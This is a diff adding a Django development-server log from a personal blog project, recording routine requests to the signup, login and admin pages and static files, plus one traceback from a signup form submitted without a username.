+[18/Jan/2021 20:30:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:30:42] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:30:42] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:30:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:34:27] "GET /auth/signup HTTP/1.1" 200 5574
+[18/Jan/2021 20:34:28] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:34:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:34:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:34:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:34:28] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:34:29] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:34:36] "GET /auth/signup HTTP/1.1" 200 5578
+[18/Jan/2021 20:34:39] "GET /auth/signup HTTP/1.1" 200 5578
+[18/Jan/2021 20:34:41] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:34:41] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:34:41] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:34:41] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:34:41] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:34:41] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:36:32] "GET /?author=1 HTTP/1.1" 200 1753
+[18/Jan/2021 20:37:06] "GET /auth/signup HTTP/1.1" 200 5607
+[18/Jan/2021 20:37:06] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:37:06] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:37:06] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:37:06] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:37:06] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:37:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:38:16] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 20:38:16] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[18/Jan/2021 20:38:16] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/css/login.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[18/Jan/2021 20:38:16] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[18/Jan/2021 20:38:16] "GET /favicon.ico HTTP/1.1" 404 2244
+[18/Jan/2021 20:38:19] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[18/Jan/2021 20:38:19] "GET /admin/ HTTP/1.1" 200 4146
+[18/Jan/2021 20:38:19] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:19] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[18/Jan/2021 20:38:19] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[18/Jan/2021 20:38:19] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 304 0
+[18/Jan/2021 20:38:19] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /admin/accounts/account/ HTTP/1.1" 200 6074
+[18/Jan/2021 20:38:21] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 20:38:21] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[18/Jan/2021 20:38:21] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[18/Jan/2021 20:38:26] "GET /auth/signup HTTP/1.1" 200 5606
+[18/Jan/2021 20:38:26] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:38:26] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:38:26] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:38:26] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:38:26] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:38:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:38:28] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 20:38:28] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:38:28] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:38:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:38:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:38:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:38:28] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:38:29] "GET /auth/signup HTTP/1.1" 200 5607
+[18/Jan/2021 20:38:30] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:38:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:38:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:38:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:38:30] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:38:51] "GET /auth/signup HTTP/1.1" 200 5560
+[18/Jan/2021 20:38:51] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:38:51] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:38:51] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:38:51] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:38:51] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:38:51] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:39:00] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:39:00] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:39:00] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:39:00] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:39:00] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:39:00] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:39:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+Internal Server Error: /auth/signup
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 39, in signup_view
+    user = Account.objects.create_user(username,email,password)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 146, in create_user
+    return self._create_user(username, email, password, **extra_fields)
+  File "/root/myvenv/lib/python3.6/site-packages/django/contrib/auth/models.py", line 135, in _create_user
+    raise ValueError('The given username must be set')
+ValueError: The given username must be set
+[18/Jan/2021 20:39:02] "POST /auth/signup HTTP/1.1" 500 72015
+[18/Jan/2021 20:39:06] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:39:06] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:39:06] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:39:06] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:39:06] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:39:06] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:39:28] "POST /auth/signup HTTP/1.1" 302 0
+[18/Jan/2021 20:39:28] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:39:28] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:39:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:39:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:39:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:39:28] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:39:32] "POST /auth/login HTTP/1.1" 200 1843
+[18/Jan/2021 20:39:32] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:39:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:39:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:39:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:39:32] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:39:40] "GET /admin HTTP/1.1" 301 0
+[18/Jan/2021 20:39:41] "GET /admin/ HTTP/1.1" 302 0
+[18/Jan/2021 20:39:41] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2383
+[18/Jan/2021 20:39:41] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:39:41] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:39:41] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
+[18/Jan/2021 20:39:41] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:39:41] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:39:41] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:39:42] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:39:42] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:39:43] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:39:46] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 2557
+[18/Jan/2021 20:39:46] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:39:46] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:39:46] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
+[18/Jan/2021 20:39:47] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:39:47] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:39:47] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:39:47] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:39:47] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:39:48] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:39:53] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[18/Jan/2021 20:39:53] "GET /admin/ HTTP/1.1" 200 4146
+[18/Jan/2021 20:39:53] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:39:53] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:39:53] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[18/Jan/2021 20:39:53] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:39:53] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:39:53] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:39:54] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:39:54] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:39:54] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[18/Jan/2021 20:39:54] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[18/Jan/2021 20:39:54] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:39:54] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:39:55] "GET /admin/accounts/account/ HTTP/1.1" 200 6282
+[18/Jan/2021 20:39:55] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:39:55] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:39:55] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6284
+[18/Jan/2021 20:39:55] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 20:39:55] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[18/Jan/2021 20:39:55] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[18/Jan/2021 20:39:55] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[18/Jan/2021 20:39:55] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[18/Jan/2021 20:39:55] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[18/Jan/2021 20:39:55] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[18/Jan/2021 20:39:55] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:39:55] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[18/Jan/2021 20:39:55] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:39:55] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[18/Jan/2021 20:39:55] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:39:55] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:39:55] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:39:56] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:39:56] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:39:56] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:40:01] "POST /admin/accounts/account/ HTTP/1.1" 200 4838
+[18/Jan/2021 20:40:02] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:40:02] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:40:02] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[18/Jan/2021 20:40:02] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[18/Jan/2021 20:40:02] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[18/Jan/2021 20:40:02] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[18/Jan/2021 20:40:02] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:40:03] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[18/Jan/2021 20:40:03] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[18/Jan/2021 20:40:03] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:40:03] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[18/Jan/2021 20:40:03] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[18/Jan/2021 20:40:03] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:40:03] "GET /static/admin/js/cancel.js HTTP/1.1" 200 857
+[18/Jan/2021 20:40:03] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:40:03] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:40:03] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:40:04] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:40:05] "POST /admin/accounts/account/ HTTP/1.1" 302 0
+[18/Jan/2021 20:40:05] "GET /admin/accounts/account/ HTTP/1.1" 200 6244
+[18/Jan/2021 20:40:05] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[18/Jan/2021 20:40:05] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[18/Jan/2021 20:40:05] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6284
+[18/Jan/2021 20:40:05] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[18/Jan/2021 20:40:05] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[18/Jan/2021 20:40:05] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[18/Jan/2021 20:40:05] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[18/Jan/2021 20:40:05] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[18/Jan/2021 20:40:05] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[18/Jan/2021 20:40:05] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[18/Jan/2021 20:40:05] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[18/Jan/2021 20:40:05] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18617
+[18/Jan/2021 20:40:05] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[18/Jan/2021 20:40:05] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[18/Jan/2021 20:40:05] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[18/Jan/2021 20:40:05] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:40:05] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[18/Jan/2021 20:40:05] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[18/Jan/2021 20:40:06] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[18/Jan/2021 20:40:06] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[18/Jan/2021 20:40:06] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[18/Jan/2021 20:40:13] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 20:40:14] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 20:40:14] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:40:18] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:40:19] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+/root/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+January 17, 2021 - 06:33:25
+Django version 3.1, using settings 'myblog.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[18/Jan/2021 20:41:46] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:41:48] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 20:41:48] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 20:41:53] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 20:41:53] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:41:57] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:42:01] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:42:01] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:42:05] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:42:26] "POST /auth/login HTTP/1.1" 302 0
+[18/Jan/2021 20:42:26] "GET / HTTP/1.1" 200 1752
+[18/Jan/2021 20:42:31] "GET /auth/login HTTP/1.1" 200 1850
+[18/Jan/2021 20:42:35] "GET /auth/logout HTTP/1.1" 302 0
+[18/Jan/2021 20:42:35] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:42:35] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:42:37] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:42:40] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:42:41] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:42:41] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:42:42] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:44:03] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:44:03] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:44:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:44:29] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:44:29] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:45:23] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:45:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:45:23] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:45:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:45:45] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:45:45] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:45:45] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:45:46] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:45:46] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:46:05] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:46:05] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:46:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:46:19] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:46:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:46:48] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:46:48] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:46:52] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:46:52] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:46:53] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:46:53] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:47:05] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:47:05] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:05] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:47:05] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:47:10] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:47:10] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:10] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:10] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:10] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:47:16] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:47:16] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:16] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:16] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:16] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:16] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:47:16] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:47:35] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:47:35] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:35] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:35] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:35] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:35] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:47:39] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:47:39] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:39] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:39] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:39] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:47:49] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:47:49] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:49] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:49] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:49] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:49] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[18/Jan/2021 20:47:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:47:55] "GET /auth/signup HTTP/1.1" 200 5555
+[18/Jan/2021 20:47:55] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:47:55] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:47:55] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:47:55] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:47:55] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:47:56] "GET /auth/login HTTP/1.1" 200 2473
